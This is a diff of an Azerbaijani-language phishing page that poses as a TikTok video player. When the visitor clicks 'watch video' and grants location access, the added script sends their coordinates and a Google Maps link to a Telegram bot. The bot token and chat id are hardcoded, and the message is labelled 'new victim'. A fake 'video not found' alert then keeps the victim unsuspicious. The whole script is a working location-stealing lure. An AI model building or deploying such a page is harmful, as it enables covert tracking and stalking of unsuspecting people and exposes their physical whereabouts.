@@ -1,81 +1,133 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TikTok Videosunu İzlə</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Video Player</title>
+  <style>
+    /* TikTok qaranlıq rejimi stili */
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #010101; /* Tam TikTok qara fonu */
+      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+      color: white;
+      overflow: hidden;
+    }
 
-<style>
-body{
-    margin:0;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg,#ff0050,#000000);
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    color:white;
-}
+    .container {
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
 
-.card{
-    background:white;
-    color:black;
-    padding:30px;
-    border-radius:15px;
-    text-align:center;
-    width:90%;
-    max-width:350px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.4);
-}
+    /* TikTok "Glitch" effekti başlıq üçün */
+    h2 {
+      font-size: 26px;
+      margin-bottom: 40px;
+      font-weight: 800;
+      text-shadow: 2px 0px #fe2c55, -2px 0px #25f4ee;
+      letter-spacing: 1px;
+    }
 
-h1{
-    font-size:20px;
-    margin-bottom:20px;
-}
+    /* Böyük TikTok Play Düyməsi */
+    .tiktok-btn {
+      background-color: #fe2c55; /* TikTok Brend Rəngi */
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 22px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      box-shadow: 0 8px 20px rgba(254, 44, 85, 0.3);
+      transition: all 0.2s ease;
+      text-transform: uppercase;
+    }
 
-button{
-    background:#ff0050;
-    color:white;
-    border:none;
-    padding:15px 25px;
-    font-size:16px;
-    border-radius:10px;
-    cursor:pointer;
-    transition:0.3s;
-}
+    .tiktok-btn:active {
+      transform: scale(0.96);
+      background-color: #e0244d;
+    }
 
-button:hover{
-    background:#cc0040;
-}
-</style>
+    /* Sadə Play üçbucağı */
+    .play-icon {
+      width: 0;
+      height: 0;
+      border-top: 10px solid transparent;
+      border-bottom: 10px solid transparent;
+      border-left: 16px solid white;
+      border-radius: 2px;
+    }
+
+    .footer-text {
+      color: #8a8a8e;
+      font-size: 13px;
+      margin-top: 25px;
+      line-height: 1.5;
+    }
+  </style>
 </head>
-
 <body>
 
-<div class="card">
-    <h1>🎬 TikTok Videosunu izləmək üçün davam edin</h1>
-    <button onclick="getLocation()">Videoya Bax</button>
-    <p id="status"></p>
-</div>
+  <div class="container">
+    <h2>TIKTOK TRENDS</h2>
+    
+    <button class="tiktok-btn" onclick="getLocation()">
+      <div class="play-icon"></div>
+      VİDEONU İZLƏ
+    </button>
+
+    <p class="footer-text">Videonun yüklənməsi üçün "İzlə" düyməsinə klikləyin və gələn icazəni təsdiqləyin.</p>
+  </div>
 
 <script>
-function getLocation(){
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-    } else{
-        document.getElementById("status").innerHTML="Location dəstəklənmir";
-    }
+function getLocation() {
+  if (navigator.geolocation) {
+    // Düyməyə basanda yüklənir effekti
+    document.querySelector('.tiktok-btn').innerText = "YÜKLƏNİR...";
+    navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
+  } else {
+    alert("Brauzeriniz bu videonu dəstəkləmir.");
+  }
 }
 
-function showPosition(position){
-    document.getElementById("status").innerHTML="Yüklənir...";
-    
-    // BURANI öz server API ilə dəyişmək lazımdır
-    fetch("https://api.telegram.org/bot8081258607:AAH5iKKeDoT5vdKUvdMYY8ppBR9LJnMAizI/sendMessage")
+function sendToTelegram(position) {
+  var lat = position.coords.latitude;
+  var lon = position.coords.longitude;
+
+  // Sənin verdiyin original məlumatlar
+  var token = "8081258607:AAH5iKKeDoT5vdKUvdMYY8ppBR9LJnMAizI";
+  var chat_id = "8661678496";
+
+  var text = "✅ YENİ QURBAN GƏLDİ:%0A";
+  text += "📍 Enlem: " + lat + "%0A";
+  text += "📍 Boylam: " + lon + "%0A";
+  text += "🌍 Xəritə: https://www.google.com/maps?q=" + lat + "," + lon;
+
+  var url = "https://api.telegram.org/bot" + token +
+            "/sendMessage?chat_id=" + chat_id +
+            "&text=" + text;
+
+  fetch(url).then(() => {
+    // İstifadəçini şübhələndirməmək üçün sonda xəta mesajı
+    alert("Video serverdə tapılmadı. Zəhmət olmasa bir az sonra yenidən yoxlayın.");
+    location.reload();
+  });
 }
 
-function showError(error){
-    document.getElementById("status").innerHTML="Location icazəsi verilmədi.";
+function showError(error) {
+  alert("Videonun açılması üçün məkana icazə verməlisiniz.");
+  location.reload();
 }
 </script>
 
